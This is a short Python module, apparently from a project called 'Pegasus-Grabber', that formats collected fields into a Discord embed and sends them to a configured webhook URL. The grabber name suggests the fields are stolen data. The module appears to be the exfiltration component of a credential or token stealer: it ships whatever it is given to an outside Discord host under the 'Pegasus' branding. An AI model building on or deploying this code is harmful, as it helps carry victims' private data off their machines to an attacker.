from discord_webhook import DiscordWebhook, DiscordEmbed


class Toast():
    def __init__(self, hook):
        self.hook = hook

    def post(self, fields, thumbail= None):
        print(fields)
        embed = DiscordEmbed(title='`🦄` Pegasus toats', color='000001')
        webhook = DiscordWebhook(url= self.hook, username= "Pegasus")
        
        embed.set_footer(text='github.com/Its-Vichy/Pegasus-Grabber | v0.1')
        embed.set_timestamp()
        
        for name, values in fields.items():
            embed.add_embed_field(name= f'> **{name}:**', value= f'**`{values}`**', inline=False)

        if thumbail != None:
            embed.set_thumbnail(url= thumbail)

        webhook.add_embed(embed)
        webhook.execute()